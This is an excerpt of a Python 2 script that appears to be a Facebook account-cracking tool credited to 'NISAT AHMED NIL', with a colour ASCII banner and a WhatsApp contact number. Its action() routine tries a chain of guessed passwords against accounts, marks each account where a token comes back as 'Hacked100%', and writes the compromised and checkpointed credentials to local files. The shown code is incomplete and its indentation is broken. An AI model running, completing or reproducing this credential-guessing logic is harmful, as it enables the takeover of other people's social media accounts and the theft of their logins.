...
\033[1;93m   .-----------------. .----------------.  .----------------.  .----------------.  .----------------. 
\033[1;93m  | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
\033[1;93m  | | ____  _____  | || |     _____    | || |    _______   | || |      __      | || |  _________   | |
\033[1;93m  | ||_   \|_   _| | || |    |_   _|   | || |   /  ___  |  | || |     /  \     | || | |  _   _  |  | |
\033[1;93m  | |  |   \ | |   | || |      | |     | || |  |  (__ \_|  | || |    / /\ \    | || | |_/ | | \_|  | |
\033[1;93m  | |  | |\ \| |   | || |      | |     | || |   '.___`-.   | || |   / ____ \   | || |     | |      | |
\033[1;93m. | | _| |_\   |_  | || |     _| |_    | || |  |`\____) |  | || | _/ /    \ \_ | || |    _| |_     | |
\033[1;93m  | ||_____|\____| | || |    |_____|   | || |  |_______.'  | || ||____|  |____|| || |   |_____|    | |
/033[1;93m  | |              | || |              | || |              | || |              | || |              | |
\033[1;93m  | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
\033[1;93m   '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 NISAT AHMED NIL💗
\x1b[1;91m➣ CODE NAME :  💣 N1S4T 💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801610906758 👬
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m💖━━━━━━━━━💘💘💘(NISAT AHMED NIL)💘💘💘━━━━━━━━💖\n" 
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://facebook.com/S4881R.4HM3D')
		login()
	elif ahmad =='0':
		exb()
	else:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[Nisat-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{Nisat-Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[Nisat-Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{Nisat-Hacked100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[Nisat-Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{Nisat-Hacked100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[Nisat-Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
